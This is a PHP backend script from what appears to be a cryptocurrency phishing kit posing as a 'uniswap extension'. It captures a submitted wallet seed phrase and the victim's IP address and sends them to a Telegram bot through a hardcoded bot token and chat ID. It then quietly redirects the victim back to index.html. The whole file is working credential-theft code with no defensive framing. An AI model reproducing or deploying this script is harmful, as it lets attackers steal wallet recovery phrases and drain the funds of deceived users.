<?php
if (isset($_POST)){
	
	 function sendMessage($messaggio) {
$chatID = '-595035808'; // like: ''
$token = '5962099167:AAFDdHNKJf_COqCyJbIHQWhIS7qzzksCTdQ'; //like: ''

$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;

}





$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "------------------+ [ uniswap extension ] +-----------------\n";
$message .= " 1.Phrase : ".$_POST['phrase']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "-----------------+ uniswap extension +-----------------\n";

$send = "xxx@gmail.com"; #dir email
$subject = " B2P $ip";
$bilhead = "From: B2P ";

sendMessage($message);
//$fp = fopen("ke.txt", "a");
  //  $savestring = $message ;
   // fwrite($fp, $savestring);
 //   fclose($fp);
	//echo "food" . print_r($_POST['phra']);
die("<script type='text/javascript'> top.location = 'index.html'; </script>");
	
	
	
	
	
	
	
	
	
	
	
	
	
	}